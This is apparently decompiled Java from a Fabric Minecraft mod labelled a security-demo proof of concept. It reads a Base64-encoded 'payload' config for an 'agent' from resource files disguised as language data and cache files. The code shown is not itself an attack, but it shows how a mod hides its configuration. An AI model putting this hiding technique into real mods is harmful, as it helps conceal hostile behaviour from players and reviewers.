package com.securitydemo.poc;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class BuiltConfigCodec {
   private static final String MOD_PACKED = "assets/security-demo-poc/lang/regional.dat";
   private static final String AGENT_PACKED = "META-INF/cache/bootstrap.dat";
   private static final String MOD_LEGACY = "assets/security-demo-poc/built-config.json";
   private static final String AGENT_LEGACY = "built-config.json";

   private BuiltConfigCodec() {
   }

   static byte[] readPackedConfig() {
      byte[] packed = readBytes("assets/security-demo-poc/lang/regional.dat");
      if (packed == null) {
         packed = readBytes("META-INF/cache/bootstrap.dat");
      }

      if (packed == null) {
         packed = readBytes("assets/security-demo-poc/built-config.json");
      }

      if (packed == null) {
         packed = readBytes("built-config.json");
      }

      return packed;
   }

   private static byte[] readBytes(String resourcePath) {
      ClassLoader loader = BuiltConfigCodec.class.getClassLoader();
      if (loader == null) {
         return null;
      } else {
         try {
            InputStream in = loader.getResourceAsStream(resourcePath);

            byte[] var8;
            label52: {
               try {
                  if (in == null) {
                     var8 = null;
                     break label52;
                  }

                  var8 = Compat.readStreamBytes(in);
               } catch (Throwable var6) {
                  if (in != null) {
                     try {
                        in.close();
                     } catch (Throwable var5) {
                        var6.addSuppressed(var5);
                     }
                  }

                  throw var6;
               }

               if (in != null) {
                  in.close();
               }

               return var8;
            }

            if (in != null) {
               in.close();
            }

            return var8;
         } catch (IOException var7) {
            return null;
         }
      }
   }

   static String decodePayload(byte[] raw) {
      if (raw != null && raw.length != 0) {
         String text = (new String(raw, StandardCharsets.UTF_8)).trim();
         if (text.isEmpty()) {
            return null;
         } else if (text.startsWith("{")) {
            return text;
         } else {
            try {
               byte[] decoded = Base64.getDecoder().decode(text);
               return new String(decoded, StandardCharsets.UTF_8);
            } catch (IllegalArgumentException var3) {
               return text;
            }
         }
      } else {
         return null;
      }
   }
}
